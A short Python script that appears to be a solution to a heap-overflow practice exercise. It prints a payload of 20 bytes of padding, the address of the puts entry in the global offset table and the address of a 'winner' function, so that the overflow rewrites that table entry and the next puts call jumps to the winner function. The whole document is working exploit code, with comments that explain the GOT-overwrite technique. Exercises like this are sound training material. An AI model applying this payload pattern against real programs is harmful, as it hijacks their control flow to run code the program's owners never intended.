import struct

"""
We will change the GOT table where puts call exists
Compiler changes the last prinft to puts for optimization
"""

# 8 bytes for buffer, 8 bytes for malloc overhead, 4 bytes for 'priority' variable
padding = "A" * 20

# address of the winner function
addr = struct.pack("I", 0x08048494)

# address in where address of 'puts' is stored
ret_addr = struct.pack("I", 0x8049774)

print(padding + ret_addr + " " + addr)